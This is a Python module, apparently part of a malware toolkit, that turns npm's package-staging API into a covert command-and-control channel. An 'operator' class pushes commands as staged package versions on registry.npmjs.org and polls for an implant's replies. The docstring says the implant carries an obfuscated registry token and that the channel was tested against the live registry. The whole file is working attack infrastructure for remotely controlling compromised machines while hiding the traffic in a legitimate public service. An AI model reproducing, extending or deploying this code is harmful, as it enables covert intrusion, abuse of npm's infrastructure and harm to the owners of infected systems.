"""Staging transport: a channel that works where dist-tags no longer do.

npm retired classic tokens and removed direct-publish from bypass-2FA
granular tokens. Verified against registry.npmjs.org:

    PUT  /-/package/<pkg>/dist-tags/<tag>   -> 403 (automation token)
    POST /-/stage/package/<pkg>             -> 201

Staging is the one write path npm still allows automation, and the one they
tell people to move to for 2027. Measured end to end against the live
registry: command published, listed back, decoded.

Security note
-------------
Unlike the dist-tag channel, reading requires the token (GET /-/stage is
401 without it). So the implant carries credentials it previously did not
need. That is the deliberate trade: write access for a token in the binary.
The token is obfuscated the same way as the dist-tag one.
"""

from __future__ import annotations

import json
import urllib.error
import urllib.request

from .crypto import derive_key, seal, open_sealed, compress, decompress
from . import UA
from . import stage as wire

LIST_URL = "/-/stage"
PUBLISH_URL = "/-/stage/package/{}"


class StageError(RuntimeError):
    """The registry rejected a staging operation."""


def _get(token: str, base: str, path: str, timeout: int = 30):
    req = urllib.request.Request(
        base.rstrip("/") + path,
        headers={"Authorization": f"Bearer {token}", "User-Agent": UA,
                 "Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.load(r)


def _post(token: str, base: str, path: str, body: dict, timeout: int = 40):
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        base.rstrip("/") + path, data=data, method="POST",
        headers={"Authorization": f"Bearer {token}", "User-Agent": UA,
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.load(r)
    except urllib.error.HTTPError as e:
        raise StageError(f"HTTP {e.code} {e.read()[:200].decode(errors='replace')}") from e


def list_messages(token, base, package, channel, kind=None):
    """Return the parsed messages this channel has staged, newest seq last."""
    data = _get(token, base, LIST_URL)
    out = []
    for item in data.get("items", []):
        if item.get("packageName") != package:
            continue
        parsed = wire.parse_version(item.get("version", ""))
        if not parsed or parsed["channel"] != channel:
            continue
        if kind and parsed["kind"] != kind:
            continue
        parsed["id"] = item.get("id")
        parsed["created"] = item.get("createdAt")
        parsed["status"] = item.get("status")
        out.append(parsed)
    out.sort(key=lambda p: p["seq"])
    return out


def publish_message(token, base, package, channel, seq, kind, data,
                    passphrase=None):
    """Stage one payload as as many versions as it needs."""
    body_bytes = compress(data)
    if passphrase:
        body_bytes = seal(derive_key(passphrase), body_bytes,
                          package.encode())
    versions = wire.encode_message(channel, seq, kind, body_bytes)
    ids = []
    for v in versions:
        status, res = _post(token, base, PUBLISH_URL.format(package),
                            wire.build_body(package, v))
        if status not in (200, 201):
            raise StageError(f"{v}: HTTP {status} {res}")
        ids.append(res.get("stageId"))
    return versions, ids


def read_messages(token, base, package, channel, kind, passphrase=None,
                  after_seq=0):
    """Read and decode every complete message newer than after_seq."""
    parts = [p for p in list_messages(token, base, package, channel, kind)
             if p["seq"] > after_seq]
    if not parts:
        return []
    key = derive_key(passphrase) if passphrase else None
    out = []
    # Group by message: every part of one message shares a base sequence, but
    # since parts are emitted seq+1, seq+2..., sort order is enough to walk
    # them. A message boundary is the part-count header.
    group = []
    expected = None
    for p in parts:
        if not p["payload"]:
            continue
        head = p["payload"][:1]
        try:
            total = wire._B32.index(head) + 1
        except ValueError:
            continue
        if expected is None:
            expected = total
        group.append(p)
        if len(group) == expected:
            raw = wire.decode_message(group)
            if key:
                try:
                    raw = open_sealed(key, raw, package.encode())
                except Exception:
                    raw = b""
            if raw:
                out.append({"seq": group[0]["seq"], "data": decompress(raw),
                            "status": group[0]["status"]})
            group, expected = [], None
    return out


# ------------------------------------------------------------------ operator
class StageOperator:
    """Operator side of the staging channel: one command, one reply."""

    def __init__(self, package, token, channel, passphrase=None,
                 base="https://registry.npmjs.org", verbose=False):
        self.package = package
        self.token = token
        self.channel = channel
        self.passphrase = passphrase
        self.base = base
        self.verbose = verbose
        self.seq = 0

    def _sync_seq(self):
        """Start after the highest sequence already on the channel."""
        try:
            msgs = list_messages(self.token, self.base, self.package,
                                 self.channel)
            if msgs:
                self.seq = max(m["seq"] for m in msgs)
        except Exception:
            pass

    def push(self, command):
        """Stage one command. Returns the versions published."""
        if not self.seq:
            self._sync_seq()
        self.seq += 1
        versions, _ = publish_message(
            self.token, self.base, self.package, self.channel, self.seq,
            "c", command.encode(), passphrase=self.passphrase)
        self.seq += len(versions) + 4
        return versions

    def wait_reply(self, after_seq, timeout=180.0, interval=5.0):
        """Poll for a reply newer than after_seq.

        Returns the newest reply seen. Replies arrive in sequence order, but a
        read can race the registry's own replication, so the highest sequence
        is used rather than the first item.
        """
        import time
        deadline = time.time() + timeout
        best = None
        while time.time() < deadline:
            time.sleep(interval)
            try:
                msgs = read_messages(
                    self.token, self.base, self.package, self.channel, "r",
                    passphrase=self.passphrase, after_seq=after_seq)
            except Exception as e:
                if self.verbose:
                    print(f"[!] poll: {e}")
                continue
            for m in msgs:
                if best is None or m["seq"] > best["seq"]:
                    best = m
            if best is not None:
                return best["data"].decode("utf-8", "replace")
        return None

    def run(self, command, timeout=180.0, interval=5.0):
        """Push a command and wait for its output.

        The reply baseline is the highest reply already on the channel, not the
        command sequence: the implant numbers replies independently, so a
        command counter would make the wait return the previous answer.
        """
        try:
            existing = list_messages(self.token, self.base, self.package,
                                     self.channel, "r")
            before = max((m["seq"] for m in existing), default=0)
        except Exception:
            before = 0
        if not self.push(command):
            return None
        return self.wait_reply(before, timeout=timeout, interval=interval)

    def clean_list(self):
        """Report how many staged messages this channel has (no delete API)."""
        msgs = list_messages(self.token, self.base, self.package,
                             self.channel)
        return len(msgs)
